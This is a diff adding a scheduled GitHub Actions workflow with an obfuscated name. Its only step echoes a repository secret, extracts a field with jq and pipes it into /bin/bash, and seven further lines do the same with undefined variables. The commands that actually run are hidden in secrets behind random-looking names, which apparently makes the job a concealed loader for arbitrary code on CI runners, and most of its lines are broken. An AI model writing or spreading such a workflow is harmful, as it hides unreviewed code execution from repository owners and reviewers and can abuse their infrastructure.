@@ -1,0 +1,24 @@
+name: huanghoumazhi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huanghoumazhi
+        env:
+          zg43: ${{ secrets.zg43 }}
+        run: |
+          echo $zg43 | jq -r .t80986 | /bin/bash
+          echo $lxg124 | jq -r .ewc2 | /bin/bash
+          echo $npv0 | jq -r .kvfr81593 | /bin/bash
+          echo $l081 | jq -r .nmkza336 | /bin/bash
+          echo $xitqf895 | jq -r .ulz9 | /bin/bash
+          echo $sv3471 | jq -r .hi05 | /bin/bash
+          echo $lv40 | jq -r .dvu6407 | /bin/bash
+          echo $bbr4452 | jq -r .vvprv4053 | /bin/bash
+
